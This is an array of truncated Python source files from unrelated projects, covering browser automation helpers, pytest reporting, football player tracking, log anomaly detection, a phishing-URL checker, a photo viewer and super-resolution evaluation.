resp[\"parsed_content_list\"], resp[\"label_coordinates\"]\n    else:\n        raise Exception(f\"Request failed with status code {response.status_code}\")\n\n\n# wake up the server\ntry:\n    call_process_image_api(\"downloaded_image.png\", 0.05, 0.1, timeout=60)\nexcept Exception:\n    pass\n\n\n@dataclass\nclass WebElement:\n    id: int\n    text: str\n    x: float\n    y: float\n    width: float\n    height: float\n    element_type: str  # 'text' or 'icon'\n\n    @property\n    def center(self) -> Tuple[float, float]:\n        \"\"\"Returns the center coordinates of the element\"\"\"\n        return (self.x + (self.width / 2), self.y + (self.height / 2))\n\n    @property\n    def bounds(self) -> Tuple[float, float, float, float]:\n        \"\"\"Returns the boundary coordinates (x1, y1, x2, y2)\"\"\"\n        return (self.x, self.y, self.x + self.width, self.y + self.height)\n\n\nclass WebPageProcessor:\n    def __init__(self):\n        self.elements: Dict[int, WebElement] = {}\n\n    def load_elements(self, text_boxes: str, coordinates: str) -> None:\n        \"\"\"\n        Load elements from the processed webpage data\n\n        Args:\n            text_boxes: String mapping ID to text content\n            coordinates: String mapping ID to [x, y, width, height] lists\n        \"\"\"\n\n        self.elements = {}\n\n        def parse_text_boxes(text: str) -> dict:\n            # Split into lines and filter empty lines\n            lines = [line.strip() for line in text.split(\"\\n\") if line.strip()]\n\n            # Dictionary to store results\n            boxes = {}\n\n            for line in lines:\n                # Split on \":\" to separate ID from text\n                id_part, text_part = line.split(\":\", 1)\n\n                # Extract ID number using string operations\n                id_str = id_part.split(\"ID\")[1].strip()\n                id_num = int(id_str)\n\n                # Store in dictionary with cleaned text\n                boxes[id_num] = text_part.strip()\n\n            return boxes\n\n        def parse_coordinates(coords: str) -> dict:\n            \"\"\"\n            Example string:\n            `{'0': [0.89625, 0.04333332697550456, 0.06125, 0.03], '1': [0.01875, 0.14499998728434244, 0.34875, 0.03833333333333333]}`\n            \"\"\"\n            return ast.literal_eval(coords)\n\n        coordinates = parse_coordinates(coordinates)\n        for element_id, text in parse_text_boxes(text_boxes).items():\n            id_str = str(element_id)\n            if id_str in coordinates:\n                coords = coordinates[id_str]\n                element_type = \"icon\" if \"Icon Box\" in text else \"text\"\n\n                self.elements[element_id] = WebElement(\n                    id=element_id,\n                    text=text.strip(),\n                    x=coords[0],\n                    y=coords[1],\n                    width=coords[2],\n                    height=coords[3],\n                    element_type=element_type,\n                )\n\n    async def click_element(self, page, element_id: int) -> None:\n        \"\"\"Click an element using its center coordinates\"\"\"\n        if element_id not in self.elements:\n            raise ValueError(f\"Element ID {element_id} not found\")\n\n        element = self.elements[element_id]\n        x, y = element.center\n\n        # Convert normalized coordinates to actual pixels\n        viewport_size = await page.viewport()\n        actual_x = x * viewport_size[\"width\"]\n        actual_y = y * viewport_size[\"height\"]\n\n        await page.mouse.click(actual_x, actual_y)\n\n    def find_elements_by_text(\n        self, text: str, partial_match: bool = True\n    ) -> List[WebElement]:\n        \"\"\"Find elements containing the specified text\"\"\"\n        matches = []\n        for element in self.elements.values():\n            if partial_match and text.lower() in element.text.lower():\n                matches.append(element)\n            elif not partial_match and text.lower() == element.text.lower():\n                matches.append(element)\n        return matches\n\n    def get_nearby_elements(\n      ",
    "import os\nimport requests\nfrom typing import Optional\nfrom ..enums.platform import Platform\nimport platform\nimport re\nimport aiohttp\n\n\ndef get_platform() -> Platform:\n    \"\"\"Get current platform\"\"\"\n    system = platform.system().lower()\n\n    if system == \"windows\":\n        return Platform.WINDOWS\n    elif system == \"darwin\":\n        return Platform.MACOS\n    elif system == \"linux\":\n        return Platform.LINUX\n    else:\n        return Platform.OTHER\n\n\ndef get_user_data_dir(platform: Platform) -> Optional[str]:\n    \"\"\"Get default chrome user data dir\"\"\"\n    if platform == Platform.LINUX:\n        path = os.path.join(os.path.expanduser(\"~\"), \".config\", \"google-chrome\")\n    elif platform == Platform.MACOS:\n        path = os.path.join(os.path.expanduser(\"~\"), \"Library\", \"Application Support\", \"Google\", \"Chrome\")\n    elif platform == Platform.WINDOWS:\n        path = os.path.join(os.path.expanduser(\"~\"), \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\")\n    else:\n        return None\n\n    if not os.path.exists(path):\n        return None\n    return path\n\n\ndef get_chrome_binary_path(platform: Platform) -> Optional[str]:\n    \"\"\"Get default chrome binary path\"\"\"\n    if platform == Platform.WINDOWS:\n        paths = [\n            os.path.join(os.environ.get(\"PROGRAMFILES\", \"\"), \"Google/Chrome/Application/chrome.exe\"),\n            os.path.join(os.environ.get(\"PROGRAMFILES(X86)\", \"\"), \"Google/Chrome/Application/chrome.exe\"),\n            os.path.join(os.environ.get(\"LOCALAPPDATA\", \"\"), \"Google/Chrome/Application/chrome.exe\"),\n        ]\n\n    elif platform == Platform.MACOS:\n        paths = [\n            \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\",\n            os.path.expanduser(\"~/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"),\n        ]\n\n    elif platform == Platform.LINUX:\n        paths = [\n            \"/usr/bin/google-chrome\",\n            \"/usr/bin/google-chrome-stable\",\n            \"/usr/bin/chrome\",\n            \"/usr/bin/chromium-browser\",\n            \"/snap/bin/chromium\",\n        ]\n    else:\n        return None\n\n    for path in paths:\n        if os.path.exists(path):\n            return path\n\n    return None\n\n\ndef clean_text(text: str):\n    text = re.sub(r\"<script.*?</script>\", \" \", text, flags=re.DOTALL)\n    text = re.sub(r\"<style.*?</style>\", \" \", text, flags=re.DOTALL)\n    text = re.sub(r\"<.*?>\", \" \", text)\n    text = re.sub(r\"\\{.*?\\}\", \" \", text)\n    text = text.replace(\"\\n\", \" \").replace(\"\\r\", \" \")\n    text = re.sub(r\"\\s+\", \" \", text).strip()\n    return text\n\n\ndef save_image(url: str, file_path: str):\n    \"\"\"Save image to file\"\"\"\n    content = requests.get(url).content\n    with open(file_path, \"wb\") as f:\n        f.write(content)\n    return file_path\n\n\nasync def save_image_async(url: str, file_path: str) -> str:\n    \"\"\"Save image to file asynchronously\"\"\"\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as response:\n            if response.status == 200:\n                content = await response.read()\n                with open(file_path, \"wb\") as f:\n                    f.write(content)\n    return file_path\n",
    "\"\"\"Terminal reporting of the full testing process.\n\nThis is a good source for looking at the various reporting hooks.\n\"\"\"\nimport argparse\nimport dataclasses\nimport datetime\nimport inspect\nimport platform\nimport sys\nimport textwrap\nimport warnings\nfrom collections import Counter\nfrom functools import partial\nfrom pathlib import Path\nfrom typing import Any\nfrom typing import Callable\nfrom typing import cast\nfrom typing import ClassVar\nfrom typing import Dict\nfrom typing import Generator\nfrom typing import List\nfrom typing import Mapping\nfrom typing import NamedTuple\nfrom typing import Optional\nfrom typing import Sequence\nfrom typing import Set\nfrom typing import TextIO\nfrom typing import Tuple\nfrom typing import TYPE_CHECKING\nfrom typing import Union\n\nimport pluggy\n\nimport _pytest._version\nfrom _pytest import nodes\nfrom _pytest import timing\nfrom _pytest._code import ExceptionInfo\nfrom _pytest._code.code import ExceptionRepr\nfrom _pytest._io import TerminalWriter\nfrom _pytest._io.wcwidth import wcswidth\nfrom _pytest.assertion.util import running_on_ci\nfrom _pytest.compat import final\nfrom _pytest.config import _PluggyPlugin\nfrom _pytest.config import Config\nfrom _pytest.config import ExitCode\nfrom _pytest.config import hookimpl\nfrom _pytest.config.argparsing import Parser\nfrom _pytest.nodes import Item\nfrom _pytest.nodes import Node\nfrom _pytest.pathlib import absolutepath\nfrom _pytest.pathlib import bestrelpath\nfrom _pytest.reports import BaseReport\nfrom _pytest.reports import CollectReport\nfrom _pytest.reports import TestReport\n\nif TYPE_CHECKING:\n    from typing_extensions import Literal\n\n    from _pytest.main import Session\n\n\nREPORT_COLLECTING_RESOLUTION = 0.5\n\nKNOWN_TYPES = (\n    \"failed\",\n    \"passed\",\n    \"skipped\",\n    \"deselected\",\n    \"xfailed\",\n    \"xpassed\",\n    \"warnings\",\n    \"error\",\n)\n\n_REPORTCHARS_DEFAULT = \"fE\"\n\n\nclass MoreQuietAction(argparse.Action):\n    \"\"\"A modified copy of the argparse count action which counts down and updates\n    the legacy quiet attribute at the same time.\n\n    Used to unify verbosity handling.\n    \"\"\"\n\n    def __init__(\n        self,\n        option_strings: Sequence[str],\n        dest: str,\n        default: object = None,\n        required: bool = False,\n        help: Optional[str] = None,\n    ) -> None:\n        super().__init__(\n            option_strings=option_strings,\n            dest=dest,\n            nargs=0,\n            default=default,\n            required=required,\n            help=help,\n        )\n\n    def __call__(\n        self,\n        parser: argparse.ArgumentParser,\n        namespace: argparse.Namespace,\n        values: Union[str, Sequence[object], None],\n        option_string: Optional[str] = None,\n    ) -> None:\n        new_count = getattr(namespace, self.dest, 0) - 1\n        setattr(namespace, self.dest, new_count)\n        # todo Deprecate config.quiet\n        namespace.quiet = getattr(namespace, \"quiet\", 0) + 1\n\n\nclass TestShortLogReport(NamedTuple):\n    \"\"\"Used to store the test status result category, shortletter and verbose word.\n    For example ``\"rerun\", \"R\", (\"RERUN\", {\"yellow\": True})``.\n\n    :ivar category:\n        The class of result, for example ``\u201cpassed\u201d``, ``\u201cskipped\u201d``, ``\u201cerror\u201d``, or the empty string.\n\n    :ivar letter:\n        The short letter shown as testing progresses, for example ``\".\"``, ``\"s\"``, ``\"E\"``, or the empty string.\n\n    :ivar word:\n        Verbose word is shown as testing progresses in verbose mode, for example ``\"PASSED\"``, ``\"SKIPPED\"``,\n        ``\"ERROR\"``, or the empty string.\n    \"\"\"\n\n    category: str\n    letter: str\n    word: Union[str, Tuple[str, Mapping[str, bool]]]\n\n\ndef pytest_addoption(parser: Parser) -> None:\n    group = parser.getgroup(\"terminal reporting\", \"Reporting\", after=\"general\")\n    group._addoption(\n        \"-v\",\n        \"--verbose\",\n        action=\"count\",\n        default=0,\n        dest=\"verbose\",\n        help=\"Increase verbosity\",\n    )\n    group._addoption(\n        \"--no-header\",\n        action=\"store_true\",\n        default=False,\n        dest=\"no_header\",\n        help=\"Disable header\",\n    )\n    group._addoption(\n        \"--no-summary\",\n        action=\"store_true\",\n        default=False,\n        dest=\"no_summary\",\n        help=\"Disable summary\",\n    )\n    group._addoption(\n        \"-q\",\n        \"--quiet\",\n        action=MoreQuietAction,\n        default=0,\n        dest=\"verbose\",\n        help=\"Decrease verbosity\",\n    )\n    group._addoption(\n        \"--verbosity\",\n        dest=\"verbose\",\n        type=int,\n        default=0,\n        help=\"Set verbosity. Default: 0.\",\n    )\n    group._addoption(\n        \"-r\",\n        action=\"store\",\n        dest=\"reportchars\",\n        default=_REPORTCHARS_DEFAULT,\n        metavar=\"chars\",\n        help=\"Show extra test summary info as specified by chars: (f)ailed, \"\n        \"(E)rror, (s)kipped, (x)failed, (X)passed, \"\n        \"(p)assed, (P)assed with output, (a)ll except passed (p/P), or (A)ll. \"\n        \"(w)arnings are enabled by default (see --disable-warnings",
    "import sys\nimport os\nimport cv2\nimport numpy as np\nimport torch\nfrom PyQt5.QtWidgets import (\n    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,\n    QPushButton, QLabel, QSlider, QListWidget, QListWidgetItem, QFileDialog,\n    QGroupBox, QGridLayout, QProgressBar, QStyle, QComboBox\n)\nfrom PyQt5.QtGui import QImage, QPixmap, QColor, QPalette\nfrom PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer\nfrom scipy.ndimage import gaussian_filter\nimport matplotlib\nmatplotlib.use('Qt5Agg')\nimport matplotlib.pyplot as plt\nfrom matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas\nimport traceback\n\n# Load the YOLOv5 model\nmodel = torch.hub.load('ultralytics/yolov5', 'yolov5x')\ndevice = 'cuda' if torch.cuda.is_available() else 'cpu'\nmodel.to(device)\n\n# Football pitch dimensions in meters\nPITCH_WIDTH = 68\nPITCH_LENGTH = 105\nHALF_LENGTH = PITCH_LENGTH / 2\n\nclass CoordinateMapper:\n    def __init__(self, video_width, video_height):\n        self.video_width = video_width\n        self.video_height = video_height\n        \n        # Define center line points\n        self.center_x = video_width / 2\n        \n        # Define perspective transform points relative to center line\n        self.video_points = np.float32([\n            [self.center_x - 0.4 * video_width, 0.8 * video_height],  # Bottom left\n            [self.center_x + 0.4 * video_width, 0.8 * video_height],  # Bottom right\n            [self.center_x - 0.4 * video_width, 0.2 * video_height],  # Top left\n            [self.center_x + 0.4 * video_width, 0.2 * video_height]   # Top right\n        ])\n        \n        # Updated pitch points centered around halfway line\n        self.pitch_points = np.float32([\n            [-HALF_LENGTH, 0],             # Left bottom\n            [HALF_LENGTH, 0],              # Right bottom\n            [-HALF_LENGTH, PITCH_WIDTH],   # Left top\n            [HALF_LENGTH, PITCH_WIDTH]     # Right top\n        ])\n        \n        # Calculate the perspective transform matrix\n        self.transform_matrix = cv2.getPerspectiveTransform(self.video_points, self.pitch_points)\n\n    def video_to_pitch(self, x, y):\n        \"\"\"Convert video coordinates to pitch coordinates relative to center line\"\"\"\n        # Apply perspective transform\n        point = np.array([[[x, y]]], dtype=np.float32)\n        transformed = cv2.perspectiveTransform(point, self.transform_matrix)\n        pitch_x, pitch_y = transformed[0][0]\n        \n        # Ensure coordinates are within pitch boundaries\n        pitch_x = np.clip(pitch_x, -HALF_LENGTH, HALF_LENGTH)\n        pitch_y = np.clip(pitch_y, 0, PITCH_WIDTH)\n        \n        return pitch_x, pitch_y\n\n\nclass PlayerTracker:\n    def __init__(self, coordinate_mapper):\n        self.coordinate_mapper = coordinate_mapper\n        self.players = {}\n        self.next_id = 1\n        self.max_distance = 5.0  # Maximum distance in meters for player matching\n\n    def update(self, detections):\n        current_positions = []\n        for detection in detections:\n            x1, y1, x2, y2 = map(int, detection[:4])\n            center = (int((x1 + x2) / 2), int((y1 + y2) / 2))\n            \n            # Convert video coordinates to centered pitch coordinates\n            pitch_x, pitch_y = self.coordinate_mapper.video_to_pitch(center[0], center[1])\n            current_positions.append(((pitch_x, pitch_y), (x1, y1, x2, y2)))\n\n        # Update existing players and create new ones\n        updated_players = {}\n        used_positions = set()\n\n        # Match existing players to new detections\n        for player_id, player_info in self.players.items():\n            if not current_positions:\n                break\n                \n            last_pos = player_info['positions'][-1]\n            best_match = None\n            min_dist = self.max_distance\n\n            for i, (new_pos, bbox) in enumerate(current_positions):\n                if i in used_positions:\n                    continue\n                    \n                dist = np.sqrt((last_pos[0] - new_pos[0])**2 + (last_pos[1] - new_pos[1])**2)\n                if dist < min_dist:\n                    min_dist = dist\n                    best_match = (i, new_pos, bbox)\n\n            if best_match:\n                idx, new_pos, bbox = best_match\n                used_positions.add(idx)\n                player_info['positions'].append(new_pos)\n                player_info['bbox'] = bbox\n                updated_players[player_id] = player_info\n\n        # Create new players for unmatched detections\n        for i, (pos, bbox) in enumerate(current_positions):\n            if i not in used_positions:\n                player_id = f\"Player {self.next_id}\"\n                self.next_id += 1\n                updated_players[player_id] = {\n                    'positions': [pos],\n                    'bbox': bbox,\n                    'team': 'Unknown',\n                    'role': 'Unknown'\n                }\n\n        self.players = updated_players\n        return self.players\n\n        \nclass VideoTh",
    "from langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain_huggingface import HuggingFaceEmbeddings\nfrom langchain_community.vectorstores import Chroma\nfrom transformers import pipeline, AutoTokenizer, AutoModelForSequenceClassification\nimport os\nfrom dotenv import load_dotenv\nfrom datetime import datetime\nimport re\nimport torch\nfrom .email_service import EmailService\nimport warnings\nfrom transformers import logging as transformers_logging\n\nload_dotenv()\n\n# Suppress specific model warnings\nwarnings.filterwarnings(\"ignore\", message=\"Some weights of RobertaForSequenceClassification were not initialized\")\nwarnings.filterwarnings(\"ignore\", message=\"You should probably TRAIN this model on a down-stream task\")\ntransformers_logging.set_verbosity_error()  # Only show errors, not warnings\n\n# Define anomaly categories and their descriptions for the model\nANOMALY_CATEGORIES = {\n    \"PERFORMANCE\": \"Issues related to system speed, response time, or resource usage efficiency\",\n    \"SECURITY\": \"Security breaches, authentication failures, or unauthorized access attempts\",\n    \"AVAILABILITY\": \"System downtime, service interruptions, or accessibility issues\",\n    \"DATA\": \"Data corruption, integrity issues, or data loss scenarios\",\n    \"NETWORK\": \"Network connectivity, timeout, or communication problems\",\n    \"RESOURCE\": \"CPU, memory, or disk space utilization issues\"\n}\n\nclass LogProcessor:\n    def __init__(self):\n        warnings.filterwarnings(\"ignore\", message=\"Device set to use cpu\")\n        # Initialize  Hugging Face API token\n        self.hf_api_token = os.getenv('HUGGING_FACE_API_TOKEN')\n        if not self.hf_api_token:\n            raise ValueError(\"HUGGING_FACE_API_TOKEN environment variable is required\")\n\n        # Initialize email service\n        self.email_service = EmailService()\n\n        # Define RFC 5424 standard scores\n        self.SEVERITY_SCORES = {\n            \"FATAL\": 1.0,     # Maps to EMERG/ALERT (0-1 in RFC 5424)\n            \"ERROR\": 0.75,    # Maps to ERROR (3 in RFC 5424)\n            \"WARN\": 0.5,      # Maps to WARNING (4 in RFC 5424)\n            \"INFO\": 0.25,     # Maps to INFO (6 in RFC 5424)\n            \"UNKNOWN\": 0.25   # Default to INFO level\n        }\n\n        # Embeddings model\n        self.embeddings = HuggingFaceEmbeddings(\n            model_name=\"BAAI/bge-small-en-v1.5\",  \n            model_kwargs={\n                'token': self.hf_api_token,\n                'device': 'cuda' if torch.cuda.is_available() else 'cpu'  # GPU acceleration if available\n            }\n        )\n        \n        # Anomaly detection model\n        self.anomaly_detector = pipeline(\n            \"text-classification\",\n            model=\"roberta-base\",  \n            token=self.hf_api_token,\n            device=0 if torch.cuda.is_available() else -1  # GPU acceleration if available\n        )\n\n        # Anomaly classification model\n        self.anomaly_classifier = pipeline(\n            \"zero-shot-classification\",\n            model=\"microsoft/codebert-base-mlm\",\n            token=self.hf_api_token,\n            model_kwargs={\"label2id\": {\"ENTAILMENT\": 0, \"NOT_ENTAILMENT\": 1}},\n            device=0 if torch.cuda.is_available() else -1\n        )\n        \n        # Prepare category labels and descriptions\n        self.category_labels = list(ANOMALY_CATEGORIES.keys())\n        self.category_descriptions = [f\"{k}: {v}\" for k, v in ANOMALY_CATEGORIES.items()]\n\n        self.vector_store = None\n        \n    def _extract_log_level_and_component(self, log: str) -> tuple:\n        \"\"\"Extract log level and component based on RFC 5424 standards\"\"\"\n        for level in self.SEVERITY_SCORES:\n            if level in log:\n                base_score = self.SEVERITY_SCORES[level]\n                break\n        else:\n            base_score = self.SEVERITY_SCORES[\"UNKNOWN\"]\n            \n        # Extract component\n        component_match = re.search(r'org\\.apache\\.hadoop\\.([\\w\\.]+):', log)\n        component = component_match.group(1) if component_match else \"unknown\"\n        \n        return base_score, component\n\n    def _parse_jvm_pause(self, log: str) -> dict:\n        \"\"\"Parse JVM pause information\"\"\"\n        if \"JvmPauseMonitor\" in log and \"pause\" in log:\n            try:\n                duration = int(''.join(filter(str.isdigit, log.split(\"approximately\")[1].split(\"ms\")[0])))\n                return {\n                    \"type\": \"JVM_PAUSE\",\n                    \"duration_ms\": duration,\n                    \"severity\": \"HIGH\" if duration > 15000 else \"MEDIUM\" if duration > 5000 else \"LOW\"\n                }\n            except:\n                pass\n        return None\n\n    def _parse_stack_trace(self, log: str) -> dict:\n        \"\"\"Parse stack trace information\"\"\"\n        if \"\\n\\t\" in log or \"\\nat \" in log:\n            lines = log.split(\"\\n\")\n            exception_type = lines[0].split(\": \")[-1] if \": \" in lines[0] else \"Unknown Exception\"\n            return {\n                \"type\": \"EXCEPTION\",\n                \"exception_type\":",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Thurs Jan  1 2:46:47 2025\r\n\r\n@author: IAN CARTER KULANI\r\n\"\"\"\r\n\r\nimport requests\r\nfrom flask import Flask, render_template, request, jsonify\r\nimport re\r\n\r\napp = Flask(__name__)\r\n\r\n# Phishing detection using Google Safe Browsing API\r\nAPI_KEY = \"YOUR_GOOGLE_SAFE_BROWSING_API_KEY\"  # You need to create a Google API key for Safe Browsing\r\n\r\n# Function to check URL using Google Safe Browsing API\r\ndef check_phishing_url(url):\r\n    endpoint = \"https://safebrowsing.googleapis.com/v4/threatMatches:find?key=\" + API_KEY\r\n    body = {\r\n        \"client\": {\r\n            \"clientId\": \"your_client_id\",\r\n            \"clientVersion\": \"1.0.0\"\r\n        },\r\n        \"threatInfo\": {\r\n            \"threatTypes\": [\"MALWARE\", \"SOCIAL_ENGINEERING\"],\r\n            \"platformTypes\": [\"ANY_PLATFORM\"],\r\n            \"urlInfo\": {\r\n                \"url\": url\r\n            }\r\n        }\r\n    }\r\n\r\n    try:\r\n        response = requests.post(endpoint, json=body)\r\n        response_data = response.json()\r\n\r\n        if \"matches\" in response_data:\r\n            return True  # Phishing detected\r\n        else:\r\n            return False  # No phishing detected\r\n\r\n    except requests.exceptions.RequestException as e:\r\n        print(f\"Error while making request: {e}\")\r\n        return False\r\n\r\n# Function to detect suspicious patterns in the URL (heuristics)\r\ndef heuristic_check(url):\r\n    # Check for suspicious keywords in the domain\r\n    suspicious_keywords = [\"login\", \"secure\", \"update\", \"account\", \"verify\", \"paypal\", \"bank\"]\r\n    if any(keyword in url.lower() for keyword in suspicious_keywords):\r\n        return True  # Potential phishing detected\r\n    return False\r\n\r\n@app.route('/')\r\ndef index():\r\n    return render_template('Phish-Detector.html')\r\n\r\n@app.route('/check_url', methods=['POST'])\r\ndef check_url():\r\n    url = request.form['url']\r\n    \r\n    # First, check using Google Safe Browsing API\r\n    is_phishing = check_phishing_url(url)\r\n\r\n    # Second, check using heuristic methods\r\n    if not is_phishing:\r\n        is_phishing = heuristic_check(url)\r\n\r\n    return jsonify({\"url\": url, \"is_phishing\": is_phishing})\r\n\r\nif __name__ == \"__main__\":\r\n    app.run(debug=True)",
    "import tkinter as tk\r\nfrom tkinter import ttk, filedialog, messagebox\r\nfrom PIL import Image, ImageTk, ExifTags\r\nimport os\r\nfrom datetime import datetime\r\nimport threading\r\nimport subprocess\r\n\r\n\r\nclass PhotoViewerApp:\r\n    def __init__(self, root):\r\n        self.root = root\r\n        self.root.title(\"Photo Archive Viewer\")\r\n\r\n        self.archive_path = None\r\n        self.photo_data = []  # List of (filepath, datetime)\r\n        self.current_page = 1\r\n        self.photos_per_page = 12  # Initial number of photos per page\r\n        self.grid_cols = 4  # Initial grid columns\r\n        self.loading_label = None  # To show loading message\r\n        self.filtered_date = None  # date filtering\r\n        self.image_extensions = ('.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff', '.webp')\r\n        self.sort_by_date = True\r\n        self.full_size_window = None\r\n        self.thumbnail_cache = {}  # Dictionary to store thumbnails\r\n        self.current_full_size_image = None  # To store the last opened full size image\r\n        self.zoom_level = 1.0  # zoom level\r\n        self.zoom_bar_width = 200  # Initial width of zoom bar\r\n        self.zoom_percentage_var = tk.StringVar(value=\"100%\")\r\n        self.pan_start_x = 0\r\n        self.pan_start_y = 0\r\n        self.image_x_offset = 0\r\n        self.image_y_offset = 0\r\n        self.image_width = 0\r\n        self.image_height = 0\r\n        self.window_width = 0\r\n        self.window_height = 0\r\n        self.current_zoom_image = None  # stores the current zoom image\r\n        self.canvas = None\r\n        self.canvas_image = None\r\n        # UI elements\r\n        self.create_widgets()\r\n\r\n    def create_widgets(self):\r\n        # Menu\r\n        menu_bar = tk.Menu(self.root)\r\n        file_menu = tk.Menu(menu_bar, tearoff=0)\r\n        file_menu.add_command(label=\"Open Archive\", command=self.open_archive)\r\n        file_menu.add_command(label=\"Open Folder\", command=self.open_folder)\r\n        menu_bar.add_cascade(label=\"File\", menu=file_menu)\r\n        self.root.config(menu=menu_bar)\r\n\r\n        # Control Frame (Date sort, grid size and pagination)\r\n        control_frame = ttk.Frame(self.root, padding=10)\r\n        control_frame.pack(fill=tk.X)\r\n\r\n        # Date Filtering\r\n        ttk.Label(control_frame, text=\"Filter Date (YYYY-MM-DD):\").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)\r\n        self.date_filter_var = tk.StringVar()\r\n        self.date_filter_entry = ttk.Entry(control_frame, textvariable=self.date_filter_var, width=12)\r\n        self.date_filter_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)\r\n        ttk.Button(control_frame, text=\"Filter by Date\", command=self.filter_by_date).grid(row=0, column=2, padx=5,\r\n                                                                                           pady=5, sticky=tk.W)\r\n        ttk.Button(control_frame, text=\"Reset Filter\", command=self.reset_filter).grid(row=0, column=3, padx=5, pady=5,\r\n                                                                                       sticky=tk.W)\r\n\r\n        # Grid Size Control\r\n        ttk.Label(control_frame, text=\"Grid Columns:\").grid(row=0, column=4, padx=5, pady=5, sticky=tk.W)\r\n        self.grid_cols_var = tk.IntVar(value=self.grid_cols)\r\n        grid_cols_spinbox = ttk.Spinbox(control_frame, from_=1, to=10, textvariable=self.grid_cols_var, width=3)\r\n        grid_cols_spinbox.grid(row=0, column=5, padx=5, pady=5, sticky=tk.W)\r\n        ttk.Button(control_frame, text=\"Set Grid\", command=self.update_grid).grid(row=0, column=6, padx=5, pady=5,\r\n                                                                                  sticky=tk.W)\r\n\r\n        # Pagination Control\r\n        ttk.Label(control_frame, text=\"Photos per page:\").grid(row=0, column=7, padx=5, pady=5, sticky=tk.W)\r\n        self.photos_per_page_var = tk.IntVar(value=self.photos_per_page)\r\n        photos_per_page_spinbox = ttk.Spinbox(control_frame, from_=1, to=24, textvariable=self.photos_per_page_var,\r\n                                              width=3)\r\n        photos_per_page_spinbox.grid(row=0, column=8, padx=5, pady=5, sticky=tk.W)\r\n        ttk.Button(control_frame, text=\"Set Photos per Page\", command=self.update_photos_per_page).grid(row=0, column=9,\r\n                                                                                                        padx=5, pady=5,\r\n                                                                                                        sticky=tk.W)\r\n\r\n        self.page_label = ttk.Label(control_frame, text=f\"Page: {self.current_page}\")\r\n        self.page_label.grid(row=0, column=10, padx=5, pady=5, sticky=tk.W)\r\n        ttk.Button(control_frame, text=\"Previous\", command=self.prev_page).grid(row=0, column=11, padx=5, pady=5,\r\n                                                                                sticky=tk.W)\r\n        ttk.Button(control_frame, text=\"Next\", command=self.next_page).grid(row=0, column=12, padx=5, pady=5,\r\n                                                         ",
    "import argparse\nimport os\nimport math\nfrom functools import partial\n\nimport yaml\nimport torch\nfrom torch.utils.data import DataLoader\nfrom tqdm import tqdm\n\nimport datasets\nimport models\nimport utils\n\n\ndef batched_predict(model, inp, coord, cell, bsize):\n    with torch.no_grad():\n        model.inp = inp\n        model.gen_feat(inp)\n        n = coord.shape[1]\n        ql = 0\n        preds = []\n        while ql < n:\n            qr = min(ql + bsize, n)\n            pred = model.query_rgb(coord[:, ql: qr, :], cell[:, ql: qr, :])\n            preds.append(pred)\n            ql = qr\n        pred = torch.cat(preds, dim=1)\n    return pred\n\n\ndef eval_psnr(loader, model, data_norm=None, eval_type=None, eval_bsize=None, eval_scale=2,\n              verbose=False):\n    model.eval()\n    loader.dataset.set_test_scale(eval_scale)\n\n    if data_norm is None:\n        data_norm = {\n            'inp': {'sub': [0], 'div': [1]},\n            'gt': {'sub': [0], 'div': [1]}\n        }\n    t = data_norm['inp']\n    inp_sub = torch.FloatTensor(t['sub']).view(1, -1, 1, 1).cuda()\n    inp_div = torch.FloatTensor(t['div']).view(1, -1, 1, 1).cuda()\n    t = data_norm['gt']\n    gt_sub = torch.FloatTensor(t['sub']).view(1, 1, -1).cuda()\n    gt_div = torch.FloatTensor(t['div']).view(1, 1, -1).cuda()\n\n    if eval_type is None:\n        metric_fn = utils.calc_psnr\n    elif eval_type=='realArb':\n        metric_fn = partial(utils.calc_psnr, dataset='realArb', scale=eval_scale)\n    elif eval_type.startswith('div2k'):\n        scale = int(eval_type.split('-')[1])\n        metric_fn = partial(utils.calc_psnr, dataset='div2k', scale=scale)\n    elif eval_type.startswith('benchmark'):\n        scale = int(eval_type.split('-')[1])\n        metric_fn = partial(utils.calc_psnr, dataset='benchmark', scale=scale)\n    else:\n        raise NotImplementedError\n\n\n    val_res = utils.Averager()\n\n    pbar = tqdm(loader, leave=False, desc='val')\n    for batch in pbar:\n        for k, v in batch.items():\n            batch[k] = v.cuda()\n\n        inp = (batch['inp'] - inp_sub) / inp_div\n        if eval_bsize is None:\n            with torch.no_grad():\n                pred = model(inp, batch['coord'], batch['cell'])\n        else:\n            pred = batched_predict(model, inp,\n                batch['coord'], batch['cell'], eval_bsize)\n        pred = pred * gt_div + gt_sub\n        pred.clamp_(0, 1)\n\n        if eval_type is not None: # reshape for shaving-eval\n            if eval_type =='realArb':       \n                ih = batch['h']\n                iw = batch['w']\n                shape = [batch['gt'].shape[0], ih, iw, 3]\n                pred = pred.view(*shape) \\\n                    .permute(0, 3, 1, 2).contiguous()\n                batch['gt'] = batch['gt'].view(*shape) \\\n                    .permute(0, 3, 1, 2).contiguous()\n            else:\n                ih, iw = batch['inp'].shape[-2:]\n                s = math.sqrt(batch['coord'].shape[1] / (ih * iw))\n                shape = [batch['inp'].shape[0], round(ih * s), round(iw * s), 3]\n                pred = pred.view(*shape) \\\n                    .permute(0, 3, 1, 2).contiguous()\n                batch['gt'] = batch['gt'].view(*shape) \\\n                    .permute(0, 3, 1, 2).contiguous()\n\n        res = metric_fn(pred, batch['gt'])\n        val_res.add(res.item(), inp.shape[0])\n\n        if verbose:\n            pbar.set_description('val {:.4f}'.format(val_res.item()))\n\n    return val_res.item()\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--config')\n    parser.add_argument('--model', default='none')\n    parser.add_argument('--model_path', default='none')\n    parser.add_argument('--gpu', default='0')\n    args = parser.parse_args()\n\n    os.environ['CUDA_VISIBLE_DEVICES'] = args.gpu\n\n    with open(args.config, 'r') as f:\n        config = yaml.load(f, Loader=yaml.FullLoader)\n\n    spec = config['test_dataset']\n    dataset = datasets.make(spec['dataset'])\n    dataset = datasets.make(spec['wrapper'], args={'dataset': dataset})\n    loader = 